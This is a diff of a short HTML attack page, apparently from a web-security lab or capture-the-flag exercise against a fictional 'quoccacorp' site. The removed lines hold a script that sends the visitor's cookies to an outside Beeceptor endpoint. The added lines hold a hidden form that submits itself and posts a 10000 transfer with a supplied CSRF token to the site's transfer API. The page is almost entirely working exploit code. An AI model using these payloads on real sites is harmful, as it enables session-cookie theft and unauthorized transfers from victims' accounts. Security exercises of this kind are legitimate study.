@@ -1,8 +1,14 @@
 <html>
 <body>
 <script>
-  // Send cookies to Beeceptor visibly in the URL
-  fetch('https://https-sakina.free.beeceptor.com/cookies?data=' + encodeURIComponent(document.cookie));
+  // Step 1: Open phish-me in an iframe to let the bot's cookies load
+  // Step 2: Submit the form — browser will automatically attach cookies
 </script>
+<form id="f" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+  <input type="hidden" name="csrf_token" value="OTg1Nw==">
+  <input type="hidden" name="username" value="z5400462">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>document.getElementById('f').submit()</script>
 </body>
 </html>
